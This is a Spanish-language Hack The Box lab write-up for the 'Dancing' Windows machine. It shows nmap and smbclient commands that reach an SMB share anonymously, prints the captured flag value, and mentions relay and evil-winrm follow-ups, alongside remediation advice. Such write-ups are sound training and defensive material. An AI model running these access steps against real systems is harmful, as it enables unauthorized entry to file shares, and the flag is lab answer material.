# HTB Machine Report — Dancing

**Date:** 2026-05-25
**Author:** Franksimon
**Platform:** Hack The Box — Starting Point
**Difficulty:** Very Easy
**OS:** Windows
**IP:** 10.129.18.173
**Status:** Pwned

---

## 1. Executive Summary

Dancing es una máquina Windows que expone un share SMB (`WorkShares`) accesible sin autenticación (null session). Dentro del share existen dos directorios de usuarios (`Amy.J`, `James.P`) con archivos accesibles públicamente, incluyendo el flag en el directorio de `James.P`.

---

## 2. Enumeration

### 2.1 Port Scan

```bash
nmap -sC -sV 10.129.18.173
```

| Port    | State | Service       | Version                        |
|---------|-------|---------------|--------------------------------|
| 135/tcp | open  | msrpc         | Microsoft Windows RPC          |
| 139/tcp | open  | netbios-ssn   | Microsoft Windows netbios-ssn  |
| 445/tcp | open  | microsoft-ds  | SMB                            |
| 5985/tcp| open  | http          | Microsoft HTTPAPI 2.0 (WinRM)  |

- SMB message signing: **enabled but not required** (vulnerable a relay attacks)
- Puerto 5985 (WinRM) presente — útil para post-explotación con `evil-winrm`

### 2.2 SMB Share Enumeration

```bash
smbclient -L 10.129.18.173 -N
```

| Share      | Type | Descripción       |
|------------|------|-------------------|
| ADMIN$     | Disk | Remote Admin      |
| C$         | Disk | Default share     |
| IPC$       | IPC  | Remote IPC        |
| WorkShares | Disk | *(sin comentario)* |

`WorkShares` es un share no estándar creado manualmente — objetivo prioritario.

---

## 3. Vulnerability Identification

| # | Vulnerability | CVE | CVSS | Location |
|---|--------------|-----|------|----------|
| 1 | SMB Null Session (acceso anónimo) | — | 7.5 | Puerto 445 / WorkShares |
| 2 | SMB Signing not required | — | 5.0 | Puerto 445 |

**Por qué es explotable:**
El share `WorkShares` no requiere credenciales. Cualquier usuario puede conectarse con `-N` (null session) y acceder a los archivos de todos los usuarios del share.

---

## 4. Exploitation

### 4.1 Acceso al share y descarga del flag

```bash
smbclient //10.129.18.173/WorkShares -N
```

```bash
# Dentro del cliente SMB:
ls
cd James.P
get flag.txt
exit
```

Archivos encontrados:
- `Amy.J\worknotes.txt` — notas de trabajo (posible intel)
- `James.P\flag.txt` — flag de la máquina

---

## 5. Post-Exploitation

### 5.1 Flag

```bash
cat flag.txt
```

**Flag:** `5f61c10dffbc77a704d76016a22f1664`

---

## 6. Remediation

| Finding | Recommendation | Priority |
|---------|---------------|----------|
| SMB Null Session habilitado | Deshabilitar acceso anónimo a shares | Critical |
| Archivos de usuarios expuestos | Revisar permisos de shares, aplicar ACLs por usuario | High |
| SMB Signing not required | Habilitar `RequireSecuritySignature` | Medium |

---

## 7. Lessons Learned

- En SMB siempre listar shares primero con `-L -N` antes de intentar credenciales.
- Los shares no estándar (sin comentario o nombre custom) son los primeros a revisar.
- El cliente `smbclient` no tiene `cat` — usar `get` para descargar y leer localmente.
- Puerto 5985 (WinRM) abierto = posible acceso con `evil-winrm` si se obtienen credenciales.

> **OSCP note:** En Windows, después de SMB anónimo siempre intentar `evil-winrm` y `psexec` si consigues credenciales. El signing deshabilitado también abre la puerta a ataques de relay (Responder + ntlmrelayx).

---

## 8. References

- HTB Starting Point — Dancing
- smbclient man page
- SMB Null Session: MS-CIFS protocol spec
